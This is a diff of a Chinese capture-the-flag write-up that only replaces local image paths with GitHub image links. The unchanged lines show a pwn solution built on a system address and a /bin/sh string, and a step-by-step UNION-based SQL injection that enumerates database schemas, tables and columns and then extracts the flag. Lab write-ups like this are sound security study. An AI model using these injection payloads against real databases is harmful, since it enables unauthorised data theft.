@@ -6,15 +6,15 @@
 
 使用IDA打开pwn，看到ebp-1Ch
 
-![image-20230719102937145](E:\typora_pictures\image-20230719102937145.png)
+![image-20230719102937145](https://github.com/wammr/smrlearning/blob/master/picture/image-20230719102937145.png)
 
 又看到有system函数，找到system的地址是0x08048568（空格键可以在图形界面和文本界面之间切换）
 
-![image-20230719104006837](E:\typora_pictures\image-20230719104006837.png)
+![image-20230719104006837](https://github.com/wammr/smrlearning/blob/master/picture/image-20230719104006837.png)
 
 又找到system中/bin/sh的地址是0x0804A02C
 
-![image-20230719103025889](E:\typora_pictures\image-20230719103025889.png)
+![image-20230719103025889](https://github.com/wammr/smrlearning/blob/master/picture/image-20230719103025889.png)
 
 解题脚本为：
 
@@ -30,7 +30,7 @@ conn.interactive()
 
 运行后得到Flag:
 
-![image-20230719104109186](E:\typora_pictures\image-20230719104109186.png)
+![image-20230719104109186](https://github.com/wammr/smrlearning/blob/master/picture/image-20230719104109186.png)
 
 ## Web
 
@@ -50,7 +50,7 @@ a' union select '1','2','3
 
 获取回显位置：
 
-![image-20230719104853356](E:/typora_pictures/image-20230719104853356.png)
+![image-20230719104853356](https://github.com/wammr/smrlearning/blob/master/picture/image-20230719104853356.png)
 
 接下来获取所有的数据库：
 
@@ -60,7 +60,7 @@ a' union select '1',(select group_concat(SCHEMA_NAME) from information_schema.sc
 
 发现有两个数据库，Information_schema和news
 
-![image-20230719105021243](E:/typora_pictures/image-20230719105021243.png)
+![image-20230719105021243](https://github.com/wammr/smrlearning/blob/master/picture/image-20230719105021243.png)
 
 看看当前数据库是什么名字：
 
@@ -68,7 +68,7 @@ a' union select '1',(select group_concat(SCHEMA_NAME) from information_schema.sc
 a' union select '1',database(),'3
 ```
 
-![image-20230719105133917](E:/typora_pictures/image-20230719105133917.png)
+![image-20230719105133917](https://github.com/wammr/smrlearning/blob/master/picture/image-20230719105133917.png)
 
 可以看到当前数据库叫news
 
@@ -78,7 +78,7 @@ a' union select '1',database(),'3
 a' union select '1',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'3
 ```
 
-![image-20230719105728471](E:/typora_pictures/image-20230719105728471.png)
+![image-20230719105728471](https://github.com/wammr/smrlearning/blob/master/picture/image-20230719105728471.png)
 
 接下来开始获取字段名：
 
@@ -86,7 +86,7 @@ a' union select '1',(select group_concat(table_name) from information_schema.tab
 a' union select '1',(select group_concat(column_name) from information_schema.columns where table_name='f1agfl4gher3'),'3
 ```
 
-![image-20230719105847480](E:/typora_pictures/image-20230719105847480.png)
+![image-20230719105847480](https://github.com/wammr/smrlearning/blob/master/picture/image-20230719105847480.png)
 
 最后获取Flag：
 
@@ -94,4 +94,4 @@ a' union select '1',(select group_concat(column_name) from information_schema.co
 a' union select '1',(select h3r31sfl4g from f1agfl4gher3),'3
 ```
 
-![image-20230719105918364](E:/typora_pictures/image-20230719105918364.png)
+![image-20230719105918364](https://github.com/wammr/smrlearning/blob/master/picture/image-20230719105918364.png)
